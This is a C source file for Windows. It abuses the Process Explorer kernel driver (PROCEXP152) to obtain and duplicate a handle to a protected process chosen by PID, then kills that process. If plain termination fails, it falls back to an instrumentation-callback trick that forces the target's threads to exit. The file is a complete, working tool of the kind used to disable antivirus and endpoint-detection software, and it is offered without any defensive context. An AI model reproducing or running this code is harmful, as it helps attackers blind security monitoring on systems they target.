#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>
#include <winternl.h>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
{
	ULONG Version;
	ULONG Reserved;
	PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, *PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;

static BOOL SCMLoadDriver(wchar_t* filepath, wchar_t* service_name)
{
	BOOL ret = FALSE;
	SC_HANDLE scm = NULL;
	SC_HANDLE service = NULL;

	scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm)
	{
		service = CreateServiceW(scm, service_name, NULL, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, filepath, NULL, NULL, NULL, NULL, NULL);
		if (service)
		{
			ret = StartServiceW(service, 0, NULL);
			CloseServiceHandle(service);
		}
		CloseServiceHandle(scm);
	}
	return ret;
}

static BOOL SCMUnloadDriver(wchar_t* service_name)
{
	BOOL ret = FALSE;
	SC_HANDLE scm = NULL;
	SC_HANDLE service = NULL;
	SERVICE_STATUS ss;

	scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm)
	{
		service = OpenServiceW(scm, service_name, SERVICE_STOP | DELETE);
		if (service)
		{
			memset(&ss, 0, sizeof(ss));
			ret = ControlService(service, SERVICE_CONTROL_STOP, &ss);
			DeleteService(service);
			CloseServiceHandle(service);
		}
		CloseServiceHandle(scm);
	}
	return ret;
}

static BOOL AddDebugPrivilege(void)
{
	HANDLE token = NULL;
	TOKEN_PRIVILEGES tp = { 0 };
	LUID luid = { 0 };

	if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
	{
		if (OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		{
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
			CloseHandle(token);
			return !GetLastError();
		}
	}
	return FALSE;
}

typedef NTSTATUS (WINAPI * __NtSetInformationProcess)(HANDLE ProcessHandle, int ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength);
typedef VOID (WINAPI * __RtlExitUserThread)(NTSTATUS ExitStatus);

#define PS_DRIVER_NAME L"PROCEXP152"
#define PS_DRIVER_FILE L"\\\\.\\PROCEXP152"
#define IOCTL_OPEN_PROTECTED_PROCESS_HANDLE 0x8335003c
#define IOCTL_DUPLICATE_TOKEN 0x8335000c
#define IOCTL_CLOSE_HANDLE 0x83350004
#define IOCTL_DUPLICATE_HANDLE 0x83350014

typedef struct _PS_DUP_HANDLE {
	HANDLE pid;
	HANDLE reserved1;
	HANDLE reserved2;
	HANDLE sourcehandle;
} PS_DUP_HANDLE, * PPS_DUP_HANDLE;

int wmain(int argc, WCHAR** argv)
{
	HMODULE ntdll = NULL;
	__NtSetInformationProcess _NtSetInformationProcess = NULL;
	NTSTATUS status = 0;
	HMODULE kernel32 = NULL;
	__RtlExitUserThread _RtlExitUserThread = NULL;
	HANDLE device = NULL;
	HANDLE process = NULL;
	ULONGLONG pid = 0;
	DWORD retbytes = 0;
	BOOL ret = FALSE;
	PS_DUP_HANDLE psdup = { 0 };
	HANDLE handle = NULL;
	WCHAR* loaddriver = NULL;
	PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION callback_info = { 0 };

	ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll)
	{
		wprintf(L"[-] Unable to resolve ntdll.dll: %u\n", (unsigned int)GetLastError());
		return 1;
	}
	_NtSetInformationProcess = (__NtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
	if (!_NtSetInformationProcess)
	{
		wprintf(L"[-] Unable to find function NtSetInformationProcess: %u\n", (unsigned int)GetLastError());
		return 1;
	}
	_RtlExitUserThread = (__RtlExitUserThread)GetProcAddress(ntdll, "RtlExitUserThread");
	if (!_RtlExitUserThread)
	{
		wprintf(L"[{-] Unable to find function ExitProcess: %u\n", (unsigned int)GetLastError());
		return 1;
	}
	if (argc < 2)
	{
		wprintf(L"Usage: %ls [PID] {driverfile}\n", argv[0]);
		return 1;
	}
	pid = (DWORD)_wtol(argv[1]);
	if (!pid)
	{
		wprintf(L"Provided PID is invalid: %ls\n", argv[1]);
		return 1;
	}
	if (argc > 2)
	{
		loaddriver = argv[2];
	}
	if (AddDebugPrivilege())
	{
		wprintf(L"[+] Debug privileges enabled\n");
	}
	else
	{
		wprintf(L"[-] Unable to enable debug privileges: %u\n", (unsigned int)GetLastError());
		return 1;
	}
	if (loaddriver)
	{
		if (SCMLoadDriver(loaddriver, PS_DRIVER_NAME))
		{
			wprintf(L"[+] Driver loaded: %ls\n", loaddriver);
		}
		else
		{
			wprintf(L"[-] Loading driver failed: %u\n", (unsigned int)GetLastError());
			return 1;
		}
	}
	device = CreateFileW(PS_DRIVER_FILE, GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (device != INVALID_HANDLE_VALUE)
	{
		wprintf(L"[+] Device driver opened: 0x%p\n", (void*)device);
		ret = DeviceIoControl(device, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&pid, sizeof(pid), &process, sizeof(HANDLE), &retbytes, NULL);
		if (!ret)
		{
			wprintf(L"[-] DeviceIoControl failed: %u\n", (unsigned int)GetLastError());
			CloseHandle(device);
			if (loaddriver)
			{
				SCMUnloadDriver(PS_DRIVER_NAME);
			}
			return 1;
		}
		if (!retbytes)
		{
			wprintf(L"[-] DeviceIoControl failed: %u\n", (unsigned int)GetLastError());
			CloseHandle(device);
			if (loaddriver)
			{
				SCMUnloadDriver(PS_DRIVER_NAME);
			}
			return 1;
		}
		wprintf(L"[+] Opened process handle: 0x%p\n", process);
		psdup.pid = (HANDLE)(ULONG_PTR)GetCurrentProcessId();
		psdup.sourcehandle = process;
		psdup.reserved1 = NULL;
		psdup.reserved2 = NULL;
		ret = DeviceIoControl(device, IOCTL_DUPLICATE_HANDLE, (LPVOID)&psdup, sizeof(psdup), &handle, sizeof(HANDLE), &retbytes, NULL);
		CloseHandle(process);
		CloseHandle(device);
		if (loaddriver)
		{
			SCMUnloadDriver(PS_DRIVER_NAME);
		}
		if (!ret)
		{
			wprintf(L"[-] DeviceIoControl failed: %u\n", (unsigned int)GetLastError());
			return 1;
		}
		if (!retbytes)
		{
			wprintf(L"[-] DeviceIoControl failed: %u\n", (unsigned int)GetLastError());
			return 1;
		}
		wprintf(L"[+] Duplicated handle: 0x%p\n", handle);
		if(!TerminateProcess(handle, 0))
		{
			wprintf(L"[-] Couldn't terminate process: %u\n", (unsigned int)GetLastError());
			callback_info.Version = 0;
			callback_info.Reserved = 0;
			callback_info.Callback = (PVOID)(ULONG_PTR)_RtlExitUserThread;
			status = _NtSetInformationProcess(handle, 40, &callback_info, sizeof(callback_info));
			if (status)
			{
				wprintf(L"[-] Placing termination callback failed: 0x%08X\n", (unsigned int)status);
				CloseHandle(handle);
				return 1;
			}
			wprintf(L"[+] Termination callback placed: %p\n", (void*)_RtlExitUserThread);
		}
		else
		{
			wprintf(L"[+] Process terminated: %u\n", (unsigned int)pid);
		}
		CloseHandle(handle);
	}
	else
	{
		wprintf(L"[-] Error opening device driver: %u\n", (unsigned int)GetLastError());
		if (loaddriver)
		{
			SCMUnloadDriver(PS_DRIVER_NAME);
		}
		return 1;
	}
	return 0;
}
